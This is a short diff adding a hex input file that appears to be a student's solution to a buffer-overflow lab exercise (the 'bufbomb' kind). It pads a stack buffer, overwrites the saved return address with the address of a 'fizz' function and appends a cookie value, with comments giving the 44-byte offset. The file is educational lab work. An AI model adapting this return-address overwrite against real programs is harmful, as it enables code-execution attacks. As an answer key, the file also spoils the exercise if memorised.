@@ -1,0 +1,14 @@
+30 31 32 33
+34 35 36 37
+30 31 32 33
+34 35 36 37
+30 31 32 33
+34 35 36 37
+30 31 32 33 /* base addr in 0x55683aa8 <_r+1039016> */
+34 35 36 37 /* return address in 0x55683ad4 <_r+1039060> */
+30 31 32 33 /* so there are needs 44(de) bytes to get the addr */
+34 35 36 37 
+30 31 32 33 
+42 8c 04 08 /* the fizz addr */
+00 00 00 00 /* where is original return space */
+1d fd 3d 7e /* my id */
